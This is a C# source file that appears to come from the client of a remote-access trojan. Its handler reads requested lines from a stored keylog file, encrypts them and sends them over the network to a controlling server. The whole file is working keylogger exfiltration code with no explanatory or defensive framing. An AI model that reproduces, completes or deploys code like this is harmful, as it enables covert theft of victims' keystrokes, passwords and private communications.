using Client.Config;
using Client.Core.Networking;
using Client.Core.Security;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class GetKeylogChunk
    {
        public static void Execute(string data)
        {
            string fullFilePath = Path.Combine(Settings.KEYLOG_ROOT_PATH, Settings.KEYLOG_SUB_PATH, Settings.KEYLOG_FILE_NAME);
            int[] dataInt = JsonConvert.DeserializeObject<int[]>(data);
            int offset = dataInt[0];
            int length = dataInt[1];
            string[] linesRequested = new string[length];
            if (File.Exists(fullFilePath))
            {
                for (int i = 0; i < length; i++)
                {
                    if (File.ReadLines(fullFilePath).Skip(offset + i).Take(1).Count() > 0)
                        linesRequested[i] = File.ReadLines(fullFilePath).Skip(offset + i).Take(1).First();
                }

                if (NetworkManager.IsConnected)
                {
                    NetworkManager.Connection.SendObject("1x19",
                        Cryptography.Encrypt(JsonConvert.SerializeObject(linesRequested)));
                }
                else
                {
                    //TODO, Buffer / Packet queue of some sort
                }

            }
            else
            {
                //NO FILE
            }
        }
    }
}
